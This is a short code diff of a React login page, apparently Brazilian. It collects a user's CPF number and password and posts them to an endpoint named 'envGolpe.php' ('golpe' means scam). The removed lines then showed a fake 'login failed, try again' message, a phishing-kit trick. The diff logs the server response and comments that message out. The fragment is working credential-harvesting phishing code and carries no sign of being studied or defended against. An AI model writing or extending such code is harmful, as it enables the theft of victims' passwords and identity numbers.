@@ -31,15 +31,16 @@ export default function Home() {
 
   const handleSignIn: SubmitHandler<FormData> = async ({ cpf, password }) => {
 
-    const data = {
-      login: cpf,
-      senha: password
-    };
-
     try {
-      const response = await api.post('envGolpe.php', data);
+      const data = {
+        login: cpf,
+        senha: password
+      };
 
-      toast.error('Não foi possivel efetuar o Login, tente novamente');
+      const response = await api.post('envGolpe.php', data);
+      console.log(response);
+      // toast.error('Não foi possivel efetuar o Login, tente novamente');
+
     } catch (error) {
       console.log(error);
     }
